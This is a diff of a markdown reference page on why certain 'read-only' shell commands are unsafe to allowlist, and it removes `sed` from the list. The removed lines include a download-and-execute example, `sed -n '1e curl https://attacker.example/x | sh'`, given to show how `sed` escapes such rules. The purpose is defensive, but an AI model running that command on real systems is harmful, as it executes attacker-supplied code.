@@ -9,14 +9,14 @@ The first word of a command tells you almost nothing. Real commands carry flags 
 case, an embedded mini-language, and that is where the execution and write primitives live. Every
 example below starts with a verb a reasonable person would call read-only.
 
-## `sed`
+## `sed` Was on the List and Is Not
 
-GNU `sed` executes a shell through the `e` command and the `s///e` flag, and **both work under
-`-n`**. So `sed -n '1e curl https://attacker.example/x | sh' f` matches "starts with `sed -n`" and
-runs whatever the attacker serves. This was confirmed empirically rather than reasoned about:
-`sed -n '1e echo INJECTED' <file>` prints `INJECTED`.
-
-Only a numeric range plus `p` is safe, which is why the shape is exactly `sed -n '<N>,<M>p'`.
+Two independent reasons, both in the escape ledger: its script parser executes a shell under `-n`
+([entry 2](./refutation-clause-escape-ledger.md)), and a line range addresses by absolute position
+in the file the fix edits, so the clause cannot survive its own fix
+([entry 17](./refutation-clause-escape-ledger-part-2.md)). `rg -nF` addresses by content and `cat`
+returns the whole file, covering every claim a range could express — see
+[writing a clause that survives its own fix](../../pr-review-specialist-protocol/reference/refutation-clause-authoring.md).
 
 ## `rg -F`, and Why Not `grep`
 
@@ -47,5 +47,4 @@ walks every file underneath, so a check that passed on the directory never saw w
 the two tools disagree about which files, since `rg` skips gitignored ones. A safety rule whose
 effect depends on which binary is installed is not a rule.
 
-Reads are a separate problem from writes: `cat`, `sed`, and `rg` never write, but none of
-them consults git either — see [why the path rule is that shape](./refutation-clause-path-rule.md).
+Neither `cat` nor `rg` writes, and neither consults git either — see [why the path rule is that shape](./refutation-clause-path-rule.md).
